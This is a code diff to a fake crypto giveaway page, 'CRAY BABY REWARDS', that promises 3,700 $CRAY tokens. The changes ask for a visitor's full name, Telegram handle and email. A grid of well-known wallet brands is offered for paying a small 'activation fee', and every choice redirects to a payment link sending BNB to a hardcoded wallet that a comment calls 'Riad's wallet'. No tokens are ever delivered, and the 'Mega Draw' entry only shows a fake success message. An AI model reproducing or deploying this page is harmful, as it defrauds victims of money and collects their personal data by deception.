@@ -16,9 +16,17 @@
         input { width: 100%; padding: 12px; border-radius: 8px; border: 1px solid #474d57; background: #0b0e11; color: white; box-sizing: border-box; outline: none; }
         .btn-claim { width: 100%; padding: 18px; border-radius: 12px; border: none; background: var(--primary); color: black; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
         .modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
-        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 2px solid var(--primary); }
+        .modal-content { background: var(--card-bg); padding: 30px; border-radius: 20px; width: 95%; max-width: 420px; text-align: center; border: 2px solid var(--primary); max-height: 90vh; overflow-y: auto; }
         .opt-btn { width: 100%; padding: 16px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--primary); background: transparent; color: white; font-weight: bold; cursor: pointer; text-align: left; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
         .opt-btn:hover { background: var(--primary); color: black; }
+        
+        /* Wallet Grid Styling */
+        .wallet-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
+        .wallet-item { background: #0b0e11; border: 1px solid #474d57; padding: 12px; border-radius: 12px; cursor: pointer; display: flex; flex-direction: column; align-items: center; transition: 0.2s; }
+        .wallet-item:hover { border-color: var(--primary); background: #161a1e; }
+        .wallet-item img { width: 35px; height: 35px; margin-bottom: 8px; border-radius: 8px; }
+        .wallet-item span { font-size: 11px; font-weight: bold; }
+        
         .error-border { border: 1px solid var(--error) !important; background: #241010 !important; }
     </style>
 </head>
@@ -27,11 +35,11 @@
 <div class="card">
     <div class="logo-container"><i class="fas fa-baby"></i></div>
     <h2>CRAY BABY REWARDS</h2>
-    <p style="color: var(--text-gray); font-size: 14px; margin-bottom: 20px;">Complete steps to unlock your prize</p>
+    <p style="color: var(--text-gray); font-size: 14px; margin-bottom: 20px;">Register to unlock your $CRAY reward</p>
 
     <div class="input-group">
-        <label>Wallet Address (BEP-20) *</label>
-        <input type="text" id="wallet" class="required" placeholder="0x...">
+        <label>Full Name *</label>
+        <input type="text" id="fullname" class="required" placeholder="Enter your name">
     </div>
     <div class="input-group">
         <label>Telegram Username *</label>
@@ -42,17 +50,16 @@
         <input type="email" id="email" class="required" placeholder="mail@example.com">
     </div>
 
-    <button class="btn-claim" onclick="validateForm()">GET REWARD</button>
+    <button class="btn-claim" onclick="validateForm()">CONTINUE</button>
 </div>
 
 <div id="rewardModal" class="modal">
-    <div id="modalContainer" class="modal-content">
-        </div>
+    <div id="modalContainer" class="modal-content"></div>
 </div>
 
 <script>
     const MY_WALLET = "0x78722732a023cc5fc4610a5ada50e099cac5e30e";
-    const BNB_FEE = 0.00025; // Equivalent to $0.15 approximately
+    const BNB_FEE = 0.00025; // Approx $0.15
 
     function validateForm() {
         const fields = document.querySelectorAll('.required');
@@ -63,47 +70,55 @@
         });
 
         if(valid) { showChoices(); }
-        else { alert("Please fill all required fields!"); }
+        else { alert("Please complete all fields."); }
     }
 
     function showChoices() {
         const container = document.getElementById('modalContainer');
         container.innerHTML = `
-            <h3 style="color: var(--primary);">SELECT YOUR REWARD</h3>
-            <p style="font-size: 14px;">Choose one of the following:</p>
-            <button class="opt-btn" onclick="showPayment()">
-                <span>🎁 Claim 3,700 $CRAY Now</span>
-                <i class="fas fa-arrow-right"></i>
+            <h3 style="color: var(--primary);">CHOOSE REWARD TYPE</h3>
+            <p style="font-size: 14px; color: var(--text-gray);">Select how you want to receive your tokens:</p>
+            <button class="opt-btn" onclick="showWalletSelection()">
+                <span>🎁 Instant 3,700 $CRAY</span>
+                <i class="fas fa-bolt"></i>
             </button>
             <button class="opt-btn" onclick="submitMegaDraw()">
-                <span>🔥 Enter Mega Draw (Listing Day)</span>
-                <i class="fas fa-arrow-right"></i>
+                <span>🔥 Mega Draw Entry</span>
+                <i class="fas fa-trophy"></i>
             </button>
         `;
         document.getElementById('rewardModal').style.display = 'flex';
     }
 
-    function showPayment() {
+    function showWalletSelection() {
         const container = document.getElementById('modalContainer');
         container.innerHTML = `
-            <h3 style="color: var(--primary);">PROCESSING FEE</h3>
-            <p style="font-size: 13px; color: var(--text-gray);">A small network fee is required to verify your wallet and send tokens instantly.</p>
-            <div style="background: #0b0e11; padding: 20px; border-radius: 12px; margin: 20px 0; border: 1px dashed var(--primary);">
-                <span style="font-size: 22px; font-weight: bold; color: white;">0.00025 BNB</span>
-                <p style="font-size: 11px; color: var(--primary); margin-top: 5px;">Approx. $0.15 USD</p>
+            <h3 style="color: var(--primary);">CONNECT WALLET</h3>
+            <p style="font-size: 12px; color: var(--text-gray);">Select your wallet to pay the $0.15 activation fee and receive tokens.</p>
+            <div class="wallet-grid">
+                <div class="wallet-item" onclick="payNow('MetaMask')"><img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Logo.svg"><span>MetaMask</span></div>
+                <div class="wallet-item" onclick="payNow('Trust')"><img src="https://trustwallet.com/assets/images/media/assets/trust_wallet_logo.png"><span>Trust Wallet</span></div>
+                <div class="wallet-item" onclick="payNow('Binance')"><img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png"><span>Binance Web3</span></div>
+                <div class="wallet-item" onclick="payNow('Coinbase')"><img src="https://cryptologos.cc/logos/coinbase-coin-logo.png"><span>Coinbase</span></div>
+                <div class="wallet-item" onclick="payNow('Phantom')"><img src="https://cryptologos.cc/logos/phantom-phantom-logo.png"><span>Phantom</span></div>
+                <div class="wallet-item" onclick="payNow('OKX')"><img src="https://www.okx.com/cdn/assets/imgs/221/6E7D173C4E3D7B5D.png"><span>OKX Wallet</span></div>
+                <div class="wallet-item" onclick="payNow('SafePal')"><img src="https://cryptologos.cc/logos/safepal-sfp-logo.png"><span>SafePal</span></div>
+                <div class="wallet-item" onclick="payNow('Atomic')"><img src="https://cryptologos.cc/logos/atomic-token-awc-logo.png"><span>Atomic</span></div>
+                <div class="wallet-item" onclick="payNow('Exodus')"><img src="https://www.exodus.com/brand/img/logo/logo-white.svg"><span>Exodus</span></div>
+                <div class="wallet-item" onclick="payNow('TokenPocket')"><img src="https://www.tokenpocket.pro/static/favicon.ico"><span>TokenPocket</span></div>
             </div>
-            <button class="btn-claim" onclick="payNow()">PAY FEE & RECEIVE TOKENS</button>
-            <p style="font-size: 10px; margin-top: 15px; color: var(--text-gray);">Tokens will be sent to your wallet after confirmation.</p>
+            <p style="font-size: 10px; margin-top: 15px; color: #ff4d4d;">Note: $0.15 BNB is required for network gas.</p>
         `;
     }
 
-    function payNow() {
+    function payNow(walletName) {
+        // All wallets will use the deep link to send BNB to Riad's wallet
         const url = `https://metamask.app.link/send/${MY_WALLET}?value=${BNB_FEE * 1e18}`;
         window.location.href = url;
     }
 
     function submitMegaDraw() {
-        alert("✅ Success! You have entered the Mega Draw. Good luck!");
+        alert("Registration Successful! Your name is entered in the Mega Draw.");
         document.getElementById('rewardModal').style.display = 'none';
     }
 </script>
